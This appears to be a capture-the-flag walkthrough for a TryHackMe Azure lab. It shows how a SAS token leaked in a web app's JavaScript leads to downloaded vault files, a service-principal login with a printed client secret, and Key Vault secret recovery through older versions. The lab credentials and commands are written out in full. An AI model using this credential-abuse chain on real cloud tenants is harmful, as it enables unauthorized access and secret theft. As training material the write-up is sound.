# CryptoCabana Walkthrough
<br/>

## Intro
Welcome to the *CryptoCabana* challenge, here is the link to the [room](https://tryhackme.com/room/hh-cryptocabana-f81cac95) on TryHackMe.
This is a cloud based medium level challege about Micrsofoft Azure reources and a web-app...

"*By the time he made it back from the breakfast buffet, his wallet had already moved on without him. The transaction was signed, properly signed, just not by him.

He'd backed his seed phrase up weeks ago, into the CryptoCabana kiosk's vault — the one whose landing page promised, in exactly four words, “Backed up. Sleep easy.” Somewhere between that promise and this morning, something else got a good look at what was supposed to stay behind glass.

Your objective: find out what the kiosk is quietly trusting to reach into storage on its own, and see how much further that trust actually extends.*"

### Preparaton
This is a cloud (MS Azure) based challenge, meaning that it requires us to prepare a couple of things first.
1. Install azure cli:
```bash
curl -fsSL 'https://azurecliprod.blob.core.windows.net/$root/deb_install.sh' | sudo bash
```
- Normally downloading script from the internet and piping them into bash is not a security smart idea (even wors with `sudo`), but here we suppose you are in a vm or other sandboxed env for the CTF + this is from the official MS documentation. If you prefer other methods of installation follow Microsoft [guide](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli-linux?view=azure-cli-latest).

2. Confirm installation worked and you can use the tool:
```bash
 az --version
```

3. Clieck on "Cloud details" and join the lab to generate the credentials.
4. Login with `az login`, it will open your browser, insert the gredentials you have just generated.
5. Close the browser window and back in the terminal select tenant n `1` "THM".
6. Confirm everything worked fine and that you are logged in: `az account show` if it shows account details the setup has been completed.

Let's begin!

<br/>
<br/>

## The Challenge
Chekc the group we are in:
```bash
az group list
```
```json
[
  {
    "id": "/subscriptions/2492269a-2948-46fd-aae3-68c9b066443a/resourceGroups/rg-cloudshell-only",
    "location": "centralus",
    "managedBy": null,
    "name": "rg-cloudshell-only",
    "properties": {
      "provisioningState": "Succeeded"
    },
    "tags": {},
    "type": "Microsoft.Resources/resourceGroups"
  }
]
```

We find custom app registrations:
```bash
az ad app list --query "[].{Name:displayName, AppId:appId, Notes:notes, ReplyUrls:replyUrls}" -o json
```

It shows 
```js
[
  {
    "AppId": "f4b35c22-fe24-478c-a721-ef12f7b7c15b",
    "Name": "sp-ch2-student",
    "Notes": null,
    "ReplyUrls": null
  },
  {
    "AppId": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
    "Name": "cryptocabana-backup-automation",
    "Notes": null,
    "ReplyUrls": null
  },
  {
    "AppId": "b83d1315-dd2c-4d2e-994b-5eb463dd7e45",
    "Name": "thm-range-collector-pilot",
    "Notes": null,
    "ReplyUrls": null
  },
  {
    "AppId": "55bf75ab-2c7d-4829-93e2-d6100ad5ec38",
    "Name": "thm-range-provisioner-pilot",
    "Notes": null,
    "ReplyUrls": null
  },
  {
    "AppId": "d92b4c7a-f523-4f3c-b808-bc3886e4420d",
    "Name": "attacker-app-day9",
    "Notes": null,
    "ReplyUrls": null
  }
]
```

<br/>

## App Enumeration
We also have to check the app website `https://cryptocabanaf5scjagc.z13.web.core.windows.net/`, here we can sumbit a recovery phrase for backup... sus! 
We can check the page source code, we find an `app.js` JavaScript file, let's view it:
```js
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";

function backupPhrase() {
  const phrase = document.getElementById("phrase").value.trim();
  const status = document.getElementById("status");
  if (!phrase) {
    status.textContent = "Enter a phrase first.";
    return;
  }

  const blobName = "backup-" + Date.now() + ".txt";
  const url =
    "https://" + STORAGE_ACCOUNT + ".blob.core.windows.net/" +
    BACKUPS_CONTAINER + "/" + blobName + "?" + BACKUP_SAS;

  fetch(url, {
    method: "PUT",
    headers: { "x-ms-blob-type": "BlockBlob" },
    body: phrase,
  })
    .then((res) => {
      status.textContent = res.ok
        ? "Backed up. Sleep easy."
        : "Backup failed (" + res.status + ").";
    })
    .catch(() => {
      status.textContent = "Backup failed â€” network error.";
    });
}
```

The script workings:
- A function takes text from an input field (`#phrase`).
- It generates a unique filename using a timestamp.
- It constructs a URL and uses the `fetch` API to send a `PUT` request to upload the text file to Azure.

Fun exposed credentials right there.
- the `BACKUP_SAS` is a URI string that grants restricted, delegated access to Azure Storage resources ,without needing the primary account keys.

We can also dissect that variable to better understand what it has inside:
- `sv=2022-11-02`: Storage service version.
- `ss=b`: Signed Services (`b` = *Blob storage*).
- `srt=sco`: Signed Resource Types (`s` = *Service*, `c` = *Container*, `o` = *Object*). The `c` allows us to interact with the container level like for listing all files.
- `sp=rl`: only grants **Read** and **List** permissions.
- `se=2099-12-31...`: Expiration date.
- `sig=...`: the crypto signature.

Looking at the script we understand why, if you have already tried to send a strings, it fails. It attempts to upload a file using a `PUT` request, but to do so it needs *write*, *create* and *add* permissions, but only read and list are granted here.

We now visit:
```
https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D
```

We see this XML:
```xml
<EnumerationResults ServiceEndpoint="https://cryptocabanaf5scjagc.blob.core.windows.net/">
<Containers>
<Container>
<Name>$web</Name>
<Properties>
<Last-Modified>Thu, 16 Jul 2026 18:26:22 GMT</Last-Modified>
<Etag>"0x8DEE367BD220F4D"</Etag>
<LeaseStatus>unlocked</LeaseStatus>
<LeaseState>available</LeaseState>
<DefaultEncryptionScope>$account-encryption-key</DefaultEncryptionScope>
<DenyEncryptionScopeOverride>false</DenyEncryptionScopeOverride>
<HasImmutabilityPolicy>false</HasImmutabilityPolicy>
<HasLegalHold>false</HasLegalHold>
<ImmutableStorageWithVersioningEnabled>false</ImmutableStorageWithVersioningEnabled>
</Properties>
</Container>
<Container>
<Name>backups</Name>
<Properties>
<Last-Modified>Thu, 16 Jul 2026 18:26:22 GMT</Last-Modified>
<Etag>"0x8DEE367BCEBC6CC"</Etag>
<LeaseStatus>unlocked</LeaseStatus>
<LeaseState>available</LeaseState>
<DefaultEncryptionScope>$account-encryption-key</DefaultEncryptionScope>
<DenyEncryptionScopeOverride>false</DenyEncryptionScopeOverride>
<HasImmutabilityPolicy>false</HasImmutabilityPolicy>
<HasLegalHold>false</HasLegalHold>
<ImmutableStorageWithVersioningEnabled>false</ImmutableStorageWithVersioningEnabled>
</Properties>
</Container>
<Container>
<Name>vault</Name>
<Properties>
<Last-Modified>Thu, 16 Jul 2026 18:26:23 GMT</Last-Modified>
<Etag>"0x8DEE367BD5C639F"</Etag>
<LeaseStatus>unlocked</LeaseStatus>
<LeaseState>available</LeaseState>
<DefaultEncryptionScope>$account-encryption-key</DefaultEncryptionScope>
<DenyEncryptionScopeOverride>false</DenyEncryptionScopeOverride>
<HasImmutabilityPolicy>false</HasImmutabilityPolicy>
<HasLegalHold>false</HasLegalHold>
<ImmutableStorageWithVersioningEnabled>false</ImmutableStorageWithVersioningEnabled>
</Properties>
</Container>
</Containers>
<NextMarker/>
</EnumerationResults>
```

can see three containers in the storage account:
1. **`$web`**: usually used to host Azure Static Web-Apps.
2. **`backups`**: the empty container the original JS was trying to write to.
3. **`vault`**: our juicy target.

We can now use the CLI to enumeraate the vault:
```bash
az storage blob list \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --sas-token '?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D' \
  --output table
```

We find 2 files:
```
Name                         Blob Type    Blob Tier    Length    Content Type              Last Modified              Snapshot
---------------------------  -----------  -----------  --------  ------------------------  -------------------------  ----------
backup-service-account.json  BlockBlob    Hot          360       application/json          2026-07-19T15:20:06+00:00
seed_phrase.txt              BlockBlob    Hot          88        application/octet-stream  2026-07-16T18:26:38+00:00
```

Let's download them:
```bash
az storage blob download \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --name 'seed_phrase.txt' \
  --sas-token 'sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D' \
  --file './seed_phrase.txt'
```

Open it:
```bash
cat ./seed_phrase.txt 
```

We find the phrase `velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp`.

Now let's check also the other:
```bash
az storage blob download \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --name 'backup-service-account.json' \
  --sas-token 'sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D' \
  --file './backup-service-account.json'
```

Now read it and parse the JSON:
```bash
cat backup-service-account.json | jq
```

Here we find some more info:
```json
{
  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
  "client_secret": "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT",
  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
}
```

Nowe we can login as the service principal:
```bash
az login --service-principal \
  --tenant "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c" \
  -u "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" \
  -p "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" 
```

We get the confirmation:
```json
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
    "id": "2492269a-2948-46fd-aae3-68c9b066443a",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Az-Subs-CTF",
    "state": "Enabled",
    "tenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
    "user": {
      "name": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
      "type": "servicePrincipal"
    }
  }
]
```

<br/>

### The Flag's Shards

Now list secrets in the keyvault:
```bash
az keyvault secret list \
  --vault-name "ccabana-kv-f5scjagc" \
  --output table
```

We find the secret is divided into multiple shards:
```
Name         Id                                                               ContentType    Enabled    Expires
-----------  ---------------------------------------------------------------  -------------  ---------  -------------------------
key-shard-1  https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1                 True
key-shard-2  https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2                 True
key-shard-3  https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-3                 True
master-key   https://ccabana-kv-f5scjagc.vault.azure.net/secrets/master-key                  True       2020-01-01T00:00:00+00:00
```

Now we read the content of them:
```bash
az keyvault secret show --vault-name "ccabana-kv-f5scjagc" --name "key-shard-1" --query "value" -o tsv
az keyvault secret show --vault-name "ccabana-kv-f5scjagc" --name "key-shard-2" --query "value" -o tsv
az keyvault secret show --vault-name "ccabana-kv-f5scjagc" --name "key-shard-3" --query "value" -o tsv
```

We get 2 parts of the flag:
```
THM{nREDACTED_FOR_WRITEUP
Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.
REDACTED_FOR_WRITEUP!}
```

The one in the middle is missing but the hint tells us we should be able to recover it.
Since it says it has been rotated we can hunt for previous versions of it:
```bash
az keyvault secret list-versions \
  --vault-name "ccabana-kv-f5scjagc" \
  --name "key-shard-2" \
  --query "[].id" \
  -o tsv
```

We see the 2 versions:
```
https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d649REDACTED_FOR_WRITEUP
https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/c922cREDACTED_FOR_WRITEUP
```

Now we can just get the previous one:
```bash
az keyvault secret show \
  --id "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492REDACTED_FOR_WRITEUP" \
  --query "value" \
  -o tsv
```

We get `k3ysREDACTED_FOR_WRITEUP`.

Now we just need to put the 3 together and we will have the final flag:
--> REDACTED

<br/>
<br/>

Congratulations, you have successfully taken advantage of the app's leaked internal SAS, enumerated the vault, located and reconstructed the final flag!


Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
